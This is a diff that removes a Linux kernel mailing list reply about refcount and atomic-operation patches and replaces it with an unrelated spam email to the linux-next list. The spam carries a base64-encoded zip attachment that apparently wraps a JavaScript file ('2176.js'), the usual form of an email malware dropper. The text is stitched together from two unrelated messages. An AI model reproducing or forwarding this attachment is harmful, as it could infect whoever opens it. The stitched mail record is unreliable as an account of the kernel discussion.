@@ -1,81 +1,75 @@
-From: Peter Zijlstra <peterz@infradead.org>
-Subject: Re: linux-next: manual merge of the akpm tree with the tip tree
-Date: Fri, 31 Mar 2017 19:48:18 +0200
-Message-ID: <20170331174818.6sqwonjhuonjmpif@hirez.programming.kicks-ass.net>
-References: <20170331164451.519d1d7e@canb.auug.org.au>
- <20170331064228.2u6x3s4yp6xolsbw@hirez.programming.kicks-ass.net>
- <20170331135448.GE4543@tassilo.jf.intel.com>
- <20170331144546.4bi6lnrcx4t6cyze@hirez.programming.kicks-ass.net>
- <20170331160242.GF4543@tassilo.jf.intel.com>
+From: <t2dnature@orange.fr>
+Subject: 40150 linux-next
+Date: Sun, 02 Apr 2017 10:30:55 -0000
+Message-ID: <149112905551.21476.7589691346830754777@surnet.ru>
+Reply-To: <t2dnature@orange.fr>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170331160242.GF4543@tassilo.jf.intel.com>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Andi Kleen <ak@linux.intel.com>
-Cc: Stephen Rothwell <sfr@canb.auug.org.au>, Andrew Morton <akpm@linux-foundation.org>, Thomas Gleixner <tglx@linutronix.de>, Ingo Molnar <mingo@elte.hu>, "H. Peter Anvin" <hpa@zytor.com>, Linux-Next Mailing List <linux-next@vger.kernel.org>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
-List-Id: linux-next.vger.kernel.org
+Content-Type: application/zip; name="907.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-next-owner@vger.kernel.org>
+Received: from ip-178-46-160-58.adsl.surnet.ru ([178.46.160.58]:47984 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751216AbdDBKbA (ORCPT <rfc822;linux-next@vger.kernel.org>);
+        Sun, 2 Apr 2017 06:31:00 -0400
+Content-Disposition: attachment
+Sender: linux-next-owner@vger.kernel.org
+List-ID: <linux-next.vger.kernel.org>
+To: linux-next <linux-next@vger.kernel.org>
 
-On Fri, Mar 31, 2017 at 09:02:42AM -0700, Andi Kleen wrote:
-> On Fri, Mar 31, 2017 at 04:45:46PM +0200, Peter Zijlstra wrote:
-> > On Fri, Mar 31, 2017 at 06:54:48AM -0700, Andi Kleen wrote:
-> > > > Argh!
-> > > > 
-> > > > Andrew, please drop that patch. And the x86 out-of-line of __atomic_add_unless().
-> > > 
-> > > Why dropping the second?  Do you have something better?
-> > 
-> > The try_cmpxchg() patches save about half the text, and do not have the
-> > out-of-line penalty as shown here:
-> > 
-> >    https://lkml.kernel.org/r/20170322165144.dtidvvbxey7w5pbd@hirez.programming.kicks-ass.net
-> 
-> Where is the source for the benchmark?
-
-In that email; heck marc.info even provides a downloadable link, you
-don't even have to go find it in your local lkml archives.
-
-> Based on the description it sounds like it's testing atomic_inc(),
-> which my patches don't change.
-
-Yes, reading is hard.
-
-It tests:
-
- lock incl
-
-vs
-
- call refcount_inc
-
-vs
-
- $inlined refcount_inc
-
-And refcount_inc() is more complex than add_unless().
-
-> BTW testing such things in tight loops is bad practice. If you run
-> them back to back the CPU pipeline has to do much more serialization,
-> which is usually not realistic and drastically overestimates
-> the overhead.
-> 
-> A better practice is to run some real workload. If you want to see
-> cycle counts you can look at LBR cycles, or PT cycles from sampling or tracing.
-
-Hey, at least I did benchmark it. You just waved your hands and are
-causing extra work for other people.
-
-> > > On the first there were no 0day regressions, so at least basic performance
-> > > checking has been done.
-> > 
-> > The first is superseded by much better patches in the scheduler tree.
-> 
-> Which patches exactly?  The new patches shrink the text too?
-
-Try your local google foo; or look at the patch that conflicted, its
-that one and the next.
-
-In the end it comes down to -mm carrying patches against trees that are
-maintained elsewhere without acks from said maintainers. I don't feel
-bad about causing conflicts.
+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
+AAAAAFBLBQYAAAAAAQABAE4AAAAuDAAAAAA=
